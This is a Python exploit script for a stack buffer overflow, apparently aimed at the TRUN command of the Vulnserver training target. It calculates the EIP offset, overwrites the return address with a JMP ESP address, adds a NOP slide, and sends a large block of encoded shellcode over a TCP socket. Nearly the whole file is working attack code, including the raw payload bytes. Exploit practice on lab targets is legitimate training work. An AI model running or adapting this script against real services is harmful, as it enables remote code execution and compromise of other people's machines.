import pwn
import struct
import socket


def exploit(host, port, fuzzsize, eip, jmpesp):
    offset = pwn.cyclic_metasploit_find(
        int(
            "0x" + eip, 16
        )
    )

    jmpesp = int(
        "0x" + jmpesp, 16
    )

    neweip = struct.pack("<I", jmpesp)

    nopslide = b"\x90" * 10

    payload = b""
    payload += b"\xda\xc8\xd9\x74\x24\xf4\xbe\x8b\x6b\xea\xca\x58"
    payload += b"\x2b\xc9\xb1\x52\x31\x70\x17\x03\x70\x17\x83\x4b"
    payload += b"\x6f\x08\x3f\xb7\x98\x4e\xc0\x47\x59\x2f\x48\xa2"
    payload += b"\x68\x6f\x2e\xa7\xdb\x5f\x24\xe5\xd7\x14\x68\x1d"
    payload += b"\x63\x58\xa5\x12\xc4\xd7\x93\x1d\xd5\x44\xe7\x3c"
    payload += b"\x55\x97\x34\x9e\x64\x58\x49\xdf\xa1\x85\xa0\x8d"
    payload += b"\x7a\xc1\x17\x21\x0e\x9f\xab\xca\x5c\x31\xac\x2f"
    payload += b"\x14\x30\x9d\xfe\x2e\x6b\x3d\x01\xe2\x07\x74\x19"
    payload += b"\xe7\x22\xce\x92\xd3\xd9\xd1\x72\x2a\x21\x7d\xbb"
    payload += b"\x82\xd0\x7f\xfc\x25\x0b\x0a\xf4\x55\xb6\x0d\xc3"
    payload += b"\x24\x6c\x9b\xd7\x8f\xe7\x3b\x33\x31\x2b\xdd\xb0"
    payload += b"\x3d\x80\xa9\x9e\x21\x17\x7d\x95\x5e\x9c\x80\x79"
    payload += b"\xd7\xe6\xa6\x5d\xb3\xbd\xc7\xc4\x19\x13\xf7\x16"
    payload += b"\xc2\xcc\x5d\x5d\xef\x19\xec\x3c\x78\xed\xdd\xbe"
    payload += b"\x78\x79\x55\xcd\x4a\x26\xcd\x59\xe7\xaf\xcb\x9e"
    payload += b"\x08\x9a\xac\x30\xf7\x25\xcd\x19\x3c\x71\x9d\x31"
    payload += b"\x95\xfa\x76\xc1\x1a\x2f\xd8\x91\xb4\x80\x99\x41"
    payload += b"\x75\x71\x72\x8b\x7a\xae\x62\xb4\x50\xc7\x09\x4f"
    payload += b"\x33\x28\x65\x4e\x1f\xc0\x74\x50\x84\x28\xf0\xb6"
    payload += b"\xd0\x5a\x54\x61\x4d\xc2\xfd\xf9\xec\x0b\x28\x84"
    payload += b"\x2f\x87\xdf\x79\xe1\x60\x95\x69\x96\x80\xe0\xd3"
    payload += b"\x31\x9e\xde\x7b\xdd\x0d\x85\x7b\xa8\x2d\x12\x2c"
    payload += b"\xfd\x80\x6b\xb8\x13\xba\xc5\xde\xe9\x5a\x2d\x5a"
    payload += b"\x36\x9f\xb0\x63\xbb\x9b\x96\x73\x05\x23\x93\x27"
    payload += b"\xd9\x72\x4d\x91\x9f\x2c\x3f\x4b\x76\x82\xe9\x1b"
    payload += b"\x0f\xe8\x29\x5d\x10\x25\xdc\x81\xa1\x90\x99\xbe"
    payload += b"\x0e\x75\x2e\xc7\x72\xe5\xd1\x12\x37\x15\x98\x3e"
    payload += b"\x1e\xbe\x45\xab\x22\xa3\x75\x06\x60\xda\xf5\xa2"
    payload += b"\x19\x19\xe5\xc7\x1c\x65\xa1\x34\x6d\xf6\x44\x3a"
    payload += b"\xc2\xf7\x4c"

    try:
        buffer = b"".join([
            b"TRUN",
            b" ",
            b"/.:/",
            b"A" * offset,
            neweip,
            nopslide,
            payload,
            b"C" * (fuzzsize - offset - len(neweip) - len(nopslide) - len(payload))
        ])

        sock = socket.socket(
            socket.AF_INET,
            socket.SOCK_STREAM
        )
        sock.settimeout(1)

        sock.connect((host, port))

        sock.send(buffer)
        print(
            "Transmitting {} bytes: {}".format(len(buffer), buffer)
        )

        sock.recv(1024)
        sock.close()

    except socket.error:
        print("Couldn't connect to socket")
